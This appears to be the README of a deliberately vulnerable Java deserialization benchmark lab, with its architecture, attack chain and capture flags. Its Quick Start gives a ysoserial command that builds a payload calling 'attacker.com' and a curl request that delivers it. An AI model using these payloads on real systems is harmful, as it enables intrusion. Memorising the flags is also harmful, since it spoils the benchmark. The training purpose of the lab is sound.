# S7BEN-VHARD-004: Java Deserialization RCE

## Overview

This benchmark demonstrates exploitation of insecure Java deserialization vulnerabilities leading to Remote Code Execution (RCE). It simulates a common enterprise Java application stack with serialized session objects and vulnerable libraries.

## Difficulty

**Tier:** 2 (Intermediate)

**Prerequisites:**
- Understanding of Java serialization/deserialization
- Knowledge of gadget chains
- Experience with ysoserial
- Basic understanding of web exploitation

## Architecture

```
172.25.0.0/16
├── 172.25.0.10 - Web App (port 8080)
│   └── Vulnerable Spring Boot application
│   └── Apache Commons Collections 3.1 (VULNERABLE)
├── 172.25.0.20 - Internal API (port 8081)
│   └── Microservice with unsafe deserialization
└── 172.25.0.30 - Victim App
    └── Target for lateral movement
```

## Vulnerabilities

1. **Insecure Deserialization** - Application deserializes user-controlled data
2. **Apache Commons Collections RCE** - Uses vulnerable version 3.1
3. **Session Cookie Deserialization** - Session data is serialized without validation
4. **API Endpoint Deserialization** - `/api/process` deserializes arbitrary objects

## Attack Chain

1. **Reconnaissance** - Discover serialized objects in responses
2. **Gadget Chain Discovery** - Identify Apache Commons Collections 3.1
3. **Payload Generation** - Use ysoserial to create malicious payload
4. **RCE** - Execute arbitrary code via deserialization
5. **Lateral Movement** - Pivot to internal services

## Flags

- **FLAG 1:** `S7BEN{java_deserialize_web_rce_a1b2c3d4e5f6}` - Obtained after RCE on web-app
- **FLAG 2:** `S7BEN{internal_api_deserialization_g7h8i9j0k1l2}` - Obtained from internal-api
- **FLAG 3:** `S7BEN{victim_app_full_compromise_m3n4o5p6q7r8}` - Obtained from victim-app

## Quick Start

```bash
# Build and start
docker compose up -d

# Check status
docker compose ps

# Test web app
curl http://localhost:8080

# Generate ysoserial payload (requires ysoserial installed)
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com' | base64

# Exploit
curl -X POST http://localhost:8080/api/process \
  -H "Content-Type: application/json" \
  -d '{"data":"<base64-payload>"}'
```

## Tools Required

- **ysoserial** - Java deserialization payload generator
- **JDK 8+** - For running ysoserial
- **curl** - For HTTP requests
- **base64** - For encoding/decoding
- **netcat** - For reverse shells (optional)

## Testing

See [TESTING.md](TESTING.md) for detailed exploitation guide.

## Cleanup

```bash
docker compose down -v
```

## Learning Resources

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [ysoserial GitHub](https://github.com/frohoff/ysoserial)
- [Java Deserialization Exploitation](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)

## Security Notice

This benchmark contains intentional security vulnerabilities:
- Insecure Java deserialization
- Vulnerable Apache Commons Collections 3.1
- No input validation on deserialization

**DO NOT** expose this environment to untrusted networks.

## License

MIT License - For educational purposes only.
